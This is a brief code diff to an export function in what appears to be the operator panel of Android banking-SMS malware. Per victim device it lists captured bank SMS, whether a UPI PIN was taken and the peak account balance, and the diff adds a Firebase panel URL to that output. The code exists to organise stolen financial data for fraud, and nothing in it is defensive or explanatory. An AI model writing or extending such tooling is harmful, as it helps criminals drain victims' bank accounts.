@@ -2612,6 +2612,7 @@ function exportTxt(auto = false) {
   sorted.forEach((d, i) => {
     const smsList = [...(d.bankSms || [])].sort(sortByRecent);
     lines.push(`----------------+#[${i + 1}]-----------------`);
+    lines.push(`Firebase: ${d.panelUrl || '—'}`);
     lines.push(`Device ID: ${d.id}`);
     lines.push(`UPI PIN: ${hasPin(d) ? 'YES' : 'NO'}`);
     if (d.maxBalance) lines.push(`Peak Avl Bal: ${fmtBal(d.maxBalance)}`);
